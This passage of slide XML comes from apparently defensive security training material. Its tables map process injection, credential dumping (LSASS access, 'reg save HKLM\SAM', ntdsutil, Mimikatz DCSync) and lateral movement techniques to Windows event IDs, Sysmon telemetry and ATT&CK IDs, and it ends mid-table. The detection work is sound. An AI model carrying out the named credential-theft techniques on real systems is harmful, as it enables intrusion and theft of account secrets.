                        <a:t>NtQueueApcThread system call; thread in alertable state</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1055.004</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302371">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Thread Hijacking</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Existing thread's context redirected to attacker code</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>GetThreadContext / SetThreadContext API sequence</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1055.003</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">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Credential Dumping Detection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Credential dumping</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (MITRE ATT&amp;CK T1003) extracts authentication credentials from operating system memory, files, or the Active Directory database. Detecting these attempts is critical because stolen credentials enable lateral movement throughout the environment.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Credential Dumping Detection (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_credential_dumping_detection.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3846107"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="521610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Credential dumping detection map: five techniques used to steal Windows credentials, each with specific forensic artifacts detectable through host telemetry.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Credential Dumping Detection (3/3)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What It Targets</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Detection Artifact</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ATT&amp;CK ID</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>LSASS Memory Access</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kerberos tickets, NTLM hashes in lsass.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sysmon ID 10: process opened lsass.exe with PROCESS_VM_READ</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1003.001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SAM Database Copy</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Local account hashes in HKLM\SAM</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>System Event 7045 + reg save HKLM\SAM command line</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1003.002</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NTDS.dit Extraction</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>All domain account hashes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ntdsutil.exe execution (Sysmon ID 1); Volume Shadow Copy creation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1003.003</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>DCSync Attack</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mimikatz replication of domain controller</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security Event 4662: DS-Replication-Get-Changes-All from non-DC</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1003.006</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302371">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Credential Manager</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Saved browser and application passwords</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>vaultcmd.exe execution; dpapi decryption calls</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1003.004</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">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Lateral Movement Detection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Lateral movement</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (MITRE ATT&amp;CK TA0008) describes an attacker's techniques for progressively moving through a network after initial access, expanding access by compromising additional hosts using stolen credentials and exploiting trust relationships.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Lateral Movement Detection (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_lateral_movement_detection.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Lateral movement detection opportunities: each hop in an attacker's network traversal generates authentication and network artifacts that can be correlated across SIEM data sources.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Lateral Movement Detection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Protocol/Tool</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Key Detection Event</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ATT&amp;CK ID</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Pass-the-Hash</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NTLM authentication with hash</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Event 4624 Logon Type 3 with NtLmSsp</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1550.002</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Pass-the-Ticket</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kerberos with forged ticket</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Event 4768/4769 with unusual service</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1550.003</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Remote Desktop</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>RDP (TCP 3389)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Event 4624 Logon Type 10; Sysmon network ID 3</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1021.001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SMB Admin Shares</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>\\host\ADMIN$</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> or </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>C$</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Event 5140 (network share access)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1021.002</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>WMI Remote Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
